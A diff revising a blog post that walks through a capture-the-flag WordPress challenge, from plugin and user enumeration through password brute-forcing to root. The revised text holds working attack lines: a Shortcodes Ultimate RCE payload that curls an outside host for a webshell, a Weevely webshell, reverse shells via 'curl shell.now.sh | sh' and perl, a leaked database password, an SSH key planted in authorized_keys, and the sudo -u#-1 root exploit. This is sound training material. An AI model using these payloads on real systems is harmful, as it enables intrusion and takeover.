@@ -98,11 +98,11 @@ Severals informations have been revealed by the scanner :
     - https://www.pluginvulnerabilities.com/2017/04/20/arbitrary-file-upload-vulnerability-in-woocommerce-catalog-enquiry/
     - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-woocommerce-catalog-enquiry-arbitrary-file-upload-3-0-0/
 
-{{< protips "Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quickly credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version." >}}
+{{< protips "Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quick credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version." >}}
 
 ### 1.3. Plugins bruteforcing
 
-During the tests, I was not really satisfied by the result found. So I launched a bruteforce attack with the following wordlists to obtained more plugins : http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt
+During the tests, I was not really satisfied by the result found. So I launched a bruteforce attack with the following wordlist to obtained more plugins : http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt
 
 
 ```bash
@@ -128,7 +128,7 @@ ID           Response   Lines    Word     Chars       Payload
 000001406:   301        9 L      28 W     369 Ch      "wp-rollback"                                      
 ```
 
-Great ! It's better. We will check all this plugins later.
+Great ! It's better. Theses plugins have been checked later.
 
 ### 1.4. Account informations gathering
 
@@ -136,7 +136,7 @@ A page on the application indicated somes usernames.
 
 ![](/img/santhacklaus-2019/screen-5-5.png)
 
-A other page indicate that partner of survive-all are cuttingedge et flyingeagle. The page also gave us an email format (for account bruteforce ?).
+A other page indicated that partner of survive-all are _cuttingedge_ and _flyingeagle_ company. The page also gave us an email format (for account bruteforce ?).
 
 ```md
 For our partners cuttingedge.com and flyringeagle.com, don’t forget the contributor access we created for your members a while back. You can use your credentials to upload some valuable content on this platform 
@@ -147,7 +147,7 @@ For our partners cuttingedge.com and flyringeagle.com, don’t forget the contri
 
 ### 1.5. Default password
 
-A page leaked informations about user credentials. Apparently user password have the specific format : **@@MonthYear@@**
+A page leaked informations about user credentials. Apparently, user password have the specific format : `@@MonthYear@@`
 
 ![](/img/santhacklaus-2019/screen-1.png)
 
@@ -162,7 +162,7 @@ http://survive-all.santhacklaus.xyz/?p=142
 
 Wordpress is vulnerable by default to users enumeration. However, wordpress developers replied that this is not a vulnerability. Let's prove them wrong !
 
-First you can easily obtains wordpress current users with the API : http://survive-all.santhacklaus.xyz/index.php?rest_route=/wp/v2/users
+First, it was possible to obtaine wordpress current users with the API : http://survive-all.santhacklaus.xyz/index.php?rest_route=/wp/v2/users
 
 {{< protips "Wordpress API is a gold mine of informations for pentester. Don't forget to add your X-WP-Nonce token in header HTTP query to obtains further informations." >}}
 
@@ -170,13 +170,13 @@ First you can easily obtains wordpress current users with the API : http://survi
 
 ![](/img/santhacklaus-2019/screen-14.png)
 
-Also we can abuse of the reset password functionnality to check if the account is available.
+Also it was possible to abuse of the reset password functionnality to check if the account is available.
 
-Here we can see that user `th1b4ud` is not available.
+Here we can see that user `th1b4ud` was not available.
 
 ![](/img/santhacklaus-2019/screen-2.png)
 
-However `admin` account is available.
+However `admin` account was available.
 
 ![](/img/santhacklaus-2019/screen-3.png)
 
@@ -187,16 +187,16 @@ With reference to informations previously obtained, we can bruteforce the applic
 
 ![](/img/santhacklaus-2019/screen-5.png)
 
-The email format to bruteforce is j.doe@cuttingedge.com and j.doe@flyingeagle.com.
+The email format to bruteforce was j.doe@cuttingedge.com and j.doe@flyingeagle.com.
 
 ![](/img/santhacklaus-2019/screen-6.png)
 
-`admin@cuttingedge.com` is not a valid email.
+`admin@cuttingedge.com` was not a valid email.
 
 ![](/img/santhacklaus-2019/screen-7.png)
 ![](/img/santhacklaus-2019/screen-8.png)
 
-However, with the username obtained by Wpscan we can find 2 valids address.
+However, with the username obtained by Wpscan we have obtained 2 valids address.
 
 ```
 s.parker@cuttingedge.com
@@ -205,7 +205,7 @@ j.yestin@cuttingedge.com
 
 ### 2.3. Valid credentials
 
-The login form is not protected against bruteforce attack. Then, we can bruteforce password for the emails previously obtained.
+The login form was not protected against bruteforce attack. Then, we have bruteforced password for the emails previously obtained.
 
 Here is a little python script to generate a nice wordlists.
 
@@ -223,7 +223,7 @@ And Burp Pro intruder did all the work !
 
 ![](/img/santhacklaus-2019/screen-9.png)
 
-This technique permited us to found s.parker password.
+This technique permited to found s.parker password.
 
 `s.parker@cuttingedge.com:@@January2018@@`
 
@@ -245,7 +245,7 @@ WPScan is really a nice tool !
 
 ![](/img/santhacklaus-2019/screen-10.png)
 
-We are now connected as **Steve Parker** and we can access to the secret notes.
+Theses credentials permitted to obtain an access as **Steve Parker**. This access also permitted to read the secret notes.
 
 ![](/img/santhacklaus-2019/screen-11.png)
 
@@ -253,56 +253,72 @@ We are now connected as **Steve Parker** and we can access to the secret notes.
 
 ## Step 3 : Plugin exploit
 
-With the previous plugins list obtained with wfuzz, I checked all of them on google and one link appear really interesting : https://wpvulndb.com/vulnerabilities/8945
+With the previous plugins list obtained with wfuzz, I checked all of them on google and one link appeared really interesting : https://wpvulndb.com/vulnerabilities/8945
 
 `Shortcodes Ultimate <= 5.0.0 - Authenticated Contributor Code Execution`
 
-The exploit is pretty simple. Lets try this on a new article.
+The exploit is pretty simple. We tried it on a new article.
 
 ![](/img/santhacklaus-2019/screen-15.png)
 
 Payload : 
 
 ```md
-[su_meta key=1 post_id=1 default='curl http://78.116.157.110:4444/RCE!!!' filter='system']
+[su_meta key=1 post_id=1 default='curl http://1.2.3.4:4444/RCE!!!' filter='system']
 ```
 
 ![](/img/santhacklaus-2019/screen-16.png)
 
-Perfect ! So beautiful ! The remote server reached our server. Our commands have been correctly executed.
+Perfect ! So beautiful ! The remote server reached our computer. Our commands have been correctly executed.
 
 
 ### 3.1. Webshell creation
 
-The basic RCE is really unconfortable. So let's create a webshell with **Weevely** !
+The basic RCE was really unconfortable. So we've created a webshell with **Weevely** !
 
-{{< protips "FIXME" >}}
+{{< protips "Weevely is a secured webshell designed for post-exploitation purposes. It's a tool naturally present on offensive distribution. More infos here : https://github.com/epinna/weevely3" >}}
 
-```md
+If you haven't develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s**t !!!) :(
+
+```bash
 [th1b4ud@th1b4ud-pc weevely3]$ ./weevely.py generate teachunbequatreude_password agent.php
 Generated 'agent.php' with password 'teachunbequatreude_password' of 742 byte size.
 ```
 
-```
-[su_meta key=1 post_id=1 default='curl http://78.116.157.110:4444/agent.php -o wp-content/uploads/3e5t12e.php' filter='system']
+We generated a webshell `agent.php` with password : `teachunbequatreude_password` (yeah I know it's a weak password, have you tried it on the CTFd platform ? :D). All we have to do is to upload it.
+
+```md
+[su_meta key=1 post_id=1 default='curl http://1.2.3.4:4444/agent.php -o wp-content/uploads/3e5t12e.php' filter='system']
 ```
 
 ![](/img/santhacklaus-2019/screen-16-4.png)
 
-```
+Done !
+
+Weevely webshell is really simple to use.
+
+```md
 [th1b4ud@th1b4ud-pc weevely3]$ ./weevely.py http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php teachunbequatreude_password
 
-[+] weevely 3.7.0
+[+] Weevely 3.7.0
 
 [+] Target:	survive-all.santhacklaus.xyz
-[+] Session:	/home/th1b4ud/.weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session
+[+] Session:	/home/th1b4ud/.Weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session
 
 [+] Browse the filesystem or execute commands starts the connection
 [+] to the target. Type :help for more information.
 
-weevely> id
+Weevely> id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
+The power of this tool comes from all its features. On this challenge, normal reverse shell weren't working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : `:backdoor_reversetcp` (yeah I know, this name s**k so much) :'(
+
+![](/img/santhacklaus-2019/screen-16-4-5.png)
+
+Weevely also have a module to enumerates suid/guid binaries to prepare your privilege escalation !
+
+```md
 www-data@081256f7edc3:/var/www/html/wp-content/uploads $ :audit_suidsgid /
 +---------------------------------------------+
 | /usr/bin/passwd                             |
@@ -328,67 +344,80 @@ www-data@081256f7edc3:/var/www/html/wp-content/uploads $ :audit_suidsgid /
 +---------------------------------------------+
 ```
 
-![](/img/santhacklaus-2019/screen-16-4-5.png)
-
 
 ### 3.2. Bdd creds
 
-With this RCE we can easily grab MySQL credentials.
+With the RCE we was able to easily grab MySQL credentials from `wp-config.php` file.
 
+```php
+<?php
+    // ** MySQL settings - You can get this info from your web host ** //
+    /** The name of the database for WordPress */
+    define( 'DB_NAME', 'wordpress');
+
+    /** MySQL database username */
+    define( 'DB_USER', 'wordpress');
+
+    /** MySQL database password */
+    define( 'DB_PASSWORD', '3m1n3m4EVERyoung1nM(y)<3');
+
+    /** MySQL hostname */
+    define( 'DB_HOST', 'db:3306');
+
+    /** Database Charset to use in creating database tables. */
+    define( 'DB_CHARSET', 'utf8');
+
+    /** The Database Collate type. Don't change this if in doubt. */
+    define( 'DB_COLLATE', '');
+?>
 ```
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'wordpress');
 
-/** MySQL database username */
-define( 'DB_USER', 'wordpress');
-
-/** MySQL database password */
-define( 'DB_PASSWORD', '3m1n3m4EVERyoung1nM(y)<3');
-
-/** MySQL hostname */
-define( 'DB_HOST', 'db:3306');
-
-/** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8');
-
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '');
-```
+Look at this l33t originality :D
 
 ### 3.3. Reverse shell
 
-We successfully obtained reverse shell. Classics payloads didn't work. We obtained a reverse shell with the following payloads.
+With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but  they weren't working. In the end we still managed to get a reverse shell with perl payload.
 
-{{< protips "FIXME" >}}
+{{< protips "In the objective to optimise your post exploitation time, I advise you to use shell.now.sh, an automated reverse shell tool : https://github.com/lukechilds/reverse-shell" >}}
 
-http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php?cmd=curl%20https://shell.now.sh/78.116.157.110:4444%20|%20sh
+`shell.now.sh` is a reverse shell provider tool. It's really simple to use : `curl https://shell.now.sh/<IP>:<PORT> | sh`
 
-https://github.com/lukechilds/reverse-shell
+Final paylod : `http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php?cmd=curl https://shell.now.sh/1.2.3.4:4444 | sh`
+
 
 ![](/img/santhacklaus-2019/screen-16-5.png)
 
-Original payload
+If you are curious, here is the original payload :
 
-```
-perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"78.116.157.110:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```bash
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"1.2.3.4:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
 ## Step 4 : Privilege escalation
 
 ### 4.1. Informations gathering
 
-curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh; ./lse.sh
-curl "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -Lo LinEnum.sh; chmod 700 LinEnum.sh; ./LinEnum.sh -r report.txt -e /var/tmp/ -t
+At this, we were in possesion of a RCE with `www-data` user. The final objective of the challenge was to obtains root access.
 
-{{< protips "FIXME" >}}
+{{< protips "Privilege escalation can be a really huge tasks if you are not well organized. Below, you will find some tools to help you in this tasks. My favorite tool is Gtfobins. This Github page reference usefull informations concerning privilege escalation with linux binaries. " >}}
 
-https://gtfobins.github.io/#
+Here is some usefull tools :
 
-In our privilege escalation researches, we localise strange binarie with setuid bit : `/opt/gather_todos_wrapper`.
+- Enumeration script : https://github.com/diego-treitos/linux-smart-enumeration/
+- Other enumeration script : https://raw.githubusercontent.com/rebootuser/LinEnum/
+- All you need to know about linux binaries exploitation : https://gtfobins.github.io
 
+Here is a one liner to easily past during your penetration test :
+
+```bash
+curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh; ./lse.sh; curl "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -Lo LinEnum.sh; chmod 700 LinEnum.sh; ./LinEnum.sh -r report.txt -e /var/tmp/ -t
 ```
-find / -user root -perm -4000 -exec ls -ldb {} \;
+
+In our privilege escalation researches, we localised strange binarie with setuid bit : `/opt/gather_todos_wrapper`.
+
+```bash
+www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb {} \;
+
 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
 -rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
 -rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
@@ -405,23 +434,46 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 ![](/img/santhacklaus-2019/screen-17.png)
 
-This script permits to guess the account credentials `testaccount:testaccount`
+This script permited to guess the account credentials `testaccount:testaccount`
 
 
-### 4.2. SSH activation
+### 4.2. Group privilege escalation
 
-This account have the permission to activate SSH service.
+A classical `sudo -l` command permited to find sudo privilege of the `testaccount` user. This account were authorized to execute with `staffteam` group privilege any command.
+
+```bash
+www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "sudo -l"
+User testaccount may run the following commands on 6a7280b6ec79:
+    (BASIC : staffteam) NOPASSWD: ALL
+```
+
+We opened an other shell with `staffteam` group privilege.
+
+
+### 4.3. SSH activation
+
+This account with `staffteam` group privilege have the permission to restart SSH service.
+
+```bash
+www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "echo testaccount | sudo -g staffteam sudo -l"
+User testaccount may run the following commands on 6a7280b6ec79:
+    (ALL, !root) ALL
+    (ALL) NOPASSWD: /etc/init.d/apache2 restart, /etc/init.d/ssh restart
+    (BASIC : staffteam) NOPASSWD: ALL
+```
 
 ```
-echo testaccount | su - testaccount -c "echo testaccount | sudo -g staffteam sudo /etc/init.d/ssh restart"
+www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "echo testaccount | sudo -g staffteam sudo /etc/init.d/ssh restart"
 ```
 
-### 4.3. SSH connexion
+Done !
+
+### 4.4. SSH connexion
 
 We dropped our SSH key in `.ssh/authorized_keys` and successfully obtained remote SSH connexion.
 
 ```
-echo testaccount | su - testaccount -c "id; mkdir -p .ssh; ls -al /home/testaccount; echo 'ssh-rsa AAAAB3NzaC[...]QPAbT thibaud@PC-Thibaud' >> /home/testaccount/.ssh/authorized_keys; ls -al .ssh"
+www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "id; mkdir -p .ssh; ls -al /home/testaccount; echo 'ssh-rsa AAAAB3NzaC[...]QPAbT th1b4ud@th1b4ud-pc' >> /home/testaccount/.ssh/authorized_keys; ls -al .ssh"
 
 uid=1000(testaccount) gid=1006(testaccount) groups=1006(testaccount),1005(survive-all)
 total 36
@@ -439,8 +491,8 @@ drwxr-xr-x 1 testaccount testaccount 4096 Dec 21 23:39 ..
 -rw-r--r-- 1 testaccount testaccount  400 Dec 21 23:55 authorized_keys
 ```
 
-```
-$ ssh testaccount@survive-all.santhacklaus.xyz
+```bash
+[th1b4ud@th1b4ud-pc ~]$ ssh testaccount@survive-all.santhacklaus.xyz
 
 Linux 1788f40d5d0e 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
 
@@ -453,25 +505,13 @@ permitted by applicable law.
 testaccount@1788f40d5d0e:~$ 
 ```
 
-### 4.4. Group privilege escalation
-
-With the sudo privilege of the `testaccount` user we obtained `staffteam` group privilege.
-
-```
-testaccount@63f5721427e4:~$ sudo -g staffteam "bash"
-
-testaccount@6a7280b6ec79:~$ sudo -l
-User testaccount may run the following commands on 6a7280b6ec79:
-    (ALL, !root) ALL
-    (ALL) NOPASSWD: /etc/init.d/apache2 restart, /etc/init.d/ssh restart
-    (BASIC : staffteam) NOPASSWD: ALL
-```
+Nice ! TTY shell access !
 
 ### 4.5. Root privilege esacalation
 
-The privilege `(ALL, !root) ALL` reffered for an early vulnerability end 2019 : https://www.exploit-db.com/exploits/47502. This exploit permits us to obtain root access on the remote server.
+The privilege `(ALL, !root) ALL` reffered for an early vulnerability end 2019 : https://www.exploit-db.com/exploits/47502. This exploit permited to obtain the final root access on the server.
 
-```
+```bash
 testaccount@63f5721427e4:~$ sudo -u#-1 /bin/bash
 Password:
 
@@ -481,3 +521,9 @@ uid=0(root) gid=1001(staffteam) groups=1001(staffteam)
 root@63f5721427e4:/home/testaccount# cat /root/flag.txt 
 SANTA{W3ll_d0ne!!You_HAVE_w0n}
 ```
+
+Tada ! A lovely challenge as usual ! :)
+
+See you next year for the v3.
+
+Th1b4ud
